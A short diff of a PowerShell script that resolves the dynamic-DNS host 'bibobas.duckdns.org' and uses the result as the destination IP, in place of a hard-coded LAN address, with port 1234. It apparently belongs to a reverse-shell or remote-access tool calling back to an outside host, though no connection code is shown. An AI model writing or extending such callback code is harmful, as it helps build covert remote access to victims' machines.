@@ -5,7 +5,7 @@ while($xx){
                 
                 Clear-DnsClientCache
                 $dnsResult = Resolve-DnsName -Name "bibobas.duckdns.org" -NoHostsFile
-                $remoteIp = $dnsResult.IPAddress
+                $DestinationIP = $dnsResult.IPAddress
                 $xx=$false
                
             } 
@@ -15,7 +15,6 @@ while($xx){
             }
 }
 
-$DestinationIP = "192.168.1.51" 
 $Port = "1234"
 
 
